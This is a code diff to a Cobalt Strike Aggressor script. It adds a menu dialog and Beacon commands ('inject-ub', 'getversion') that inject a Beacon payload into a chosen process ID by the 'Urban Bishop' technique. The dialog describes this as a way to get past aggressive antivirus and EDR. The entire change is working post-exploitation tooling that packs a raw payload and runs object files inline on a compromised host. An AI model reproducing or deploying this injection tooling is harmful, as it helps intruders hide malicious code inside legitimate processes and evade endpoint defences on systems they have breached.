@@ -52,7 +52,33 @@ item "RemoteProcessInjection - Mr-Un1k0d3r - x64"{
             rpi64($bid);
       }
 
-    }    
+
+sub monitor_tickets{
+    $bid = $1;
+    $dialog = dialog("Urban Bishop Process Injection", %(processid => "", listener => "", execmethod => "fireAlias"), lambda({
+        $cmdargs = "";
+		$cmdargs = "$3['processid'] $3['listener']";
+        if ($3["execmethod"] eq "fireAlias"){
+            btask($bid, 'Injecting Urban Bishop');
+            bfireAlias($bid, inject-ub, $cmdargs);
+        }
+    }));
+    dialog_description($dialog, "This is a process injection technique that may help with aggressive AV and EDR");
+    drow_text($dialog, "processid",  "Process ID to inject into");
+    drow_text($dialog, "filteruser",  "Listener Name");
+    dbutton_action($dialog, "Run");
+	dialog_show($dialog);
+}
+
+    } #End Menu
+
+
+#################################
+#
+#
+# Sk3w's Urban Bishop Injection 
+#
+#################################    
     
 }    
     ###################################		         		###################################
@@ -113,3 +139,46 @@ sub smbexeccsharp{
     dbutton_action($dialog, "Execute");
 	dialog_show($dialog);
 }
+
+
+
+
+
+
+
+#################################
+#
+#
+# Sk3w's Urban Bishop Injection (Command Registers)
+#
+#################################
+
+alias getversion {
+    local('$barch $handle $data');
+    $barch  = barch($1);
+    $handle = openf(script_resource("/exe/getversion. $+ $barch $+ .o"));
+    $data = readb($handle, -1);
+    closef($handle);
+    beacon_inline_execute($1, $data, "go");
+}
+
+beacon_command_register(
+    "getversion",
+    "get windows major.minor.build version",
+    "Usage: getversion");
+
+alias inject-ub {
+    local('$barch $handle $data $payload $args');
+    $barch  = barch($1);
+    $handle = openf(script_resource("/exe/inject_urbanbishop. $+ $barch $+ .o"));
+    $data = readb($handle, -1);
+    closef($handle);
+    $payload = artifact_payload($3, "raw", $barch);
+    $args = bof_pack($1, "ib", $2, $payload);
+    beacon_inline_execute($1, $data, "inject", $args);
+}
+
+beacon_command_register(
+    "inject-ub",
+    "inject beacon using urbanbishop technique",
+    "Usage: inject-ub [pid] [listener]");
